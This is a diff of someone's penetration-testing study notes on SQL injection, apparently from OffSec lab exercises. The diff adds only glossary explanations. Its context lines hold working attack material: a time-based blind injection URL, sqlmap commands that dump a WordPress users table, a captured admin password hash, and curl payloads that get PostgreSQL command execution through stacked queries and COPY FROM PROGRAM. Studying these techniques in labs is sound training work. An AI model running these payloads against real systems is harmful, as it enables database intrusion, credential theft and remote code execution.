@@ -80,7 +80,7 @@ SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
 ![[Pasted image 20260802000127.png]]
 **MSSQL, native to the Windows ecosystem:**
 
-Windows has a built-in `sqlcmd` tool, but from Kali you'll usually use **Impacket**'s `impacket-mssqlclient`, which speaks the TDS protocol MSSQL uses.
+Windows has a built-in `sqlcmd` tool, but from Kali you'll usually use **Impacket**'s `impacket-mssqlclient`, which speaks the TDS protocol (Tabular Data Stream, the network protocol MSSQL uses to send and receive data) MSSQL uses.
 
 **Step 1: Connect with Windows authentication (NTLM, not Kerberos)**
 ```bash
@@ -352,7 +352,7 @@ http://<target>/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
 
 ### 10.3.1. Manual Code Execution
 
-Depending on the DBMS, getting from SQLi to actual OS command execution looks different.
+Depending on the DBMS (Database Management System, meaning which database software is running, MySQL, MSSQL, PostgreSQL, etc), getting from SQLi to actual OS command execution looks different.
 
 **MSSQL: `xp_cmdshell`**
 
@@ -582,7 +582,7 @@ Confirmed: `question_id` (GET) injectable via MySQL time-based blind (`AND (SELE
 sqlmap -u "..." -p question_id --batch --ignore-code=404 --dbs
 sqlmap -u "..." -p question_id --batch --ignore-code=404 -D wordpress -T wp_users --dump
 ```
-One row: `admin` / `$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0` (WordPress phpass hash). sqlmap's own dictionary cracker (smalldict.txt) came back empty.
+One row: `admin` / `$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0` (WordPress phpass hash, a password hashing scheme used by WordPress and PHP applications, recognisable by the `$P$` prefix). sqlmap's own dictionary cracker (smalldict.txt) came back empty.
 
 **Step 9: Crack the hash with John + rockyou**
 ```bash
@@ -794,7 +794,7 @@ curl -s -X POST --data "weight=70&height=x'; CREATE TABLE IF NOT EXISTS cmd_exec
 
 curl -s -X POST --data "weight=70&height=x%' UNION SELECT NULL,CAST((SELECT string_agg(cmd_output, ' | ')) AS int),NULL,NULL,NULL,NULL FROM cmd_exec-- &age=25&gender=Male&email=test@test.com" http://192.168.170.49/class.php | grep -iE "warning|error"
 ```
-Confirmed RCE: `uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)`. This needed **stacked queries** (multiple `;`-separated statements in one call), which only works here because the backend uses PHP's `pg_query()`, which allows it (unlike `mysqli_query`, which needs `multi_query` explicitly). `COPY FROM PROGRAM` pipes a command's stdout into a table as rows, there's no direct return channel, so the output has to be read back out through the same `CAST()`-error trick used for data extraction.
+Confirmed RCE: `uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)`. This needed **stacked queries** (multiple `;`-separated SQL statements sent in a single call, effectively "stacking" extra commands onto the end of the original one), which only works here because the backend uses PHP's `pg_query()`, which allows it (unlike `mysqli_query`, which needs `multi_query` explicitly). `COPY FROM PROGRAM` pipes a command's stdout into a table as rows, there's no direct return channel, so the output has to be read back out through the same `CAST()`-error trick used for data extraction.
 
 > 🔍 Full breakdown of the `COPY FROM PROGRAM` mechanics: [[SQL Injection (Breakdowns)#PostgreSQL RCE via COPY ... FROM PROGRAM (superuser only)|Command Breakdowns]]
 
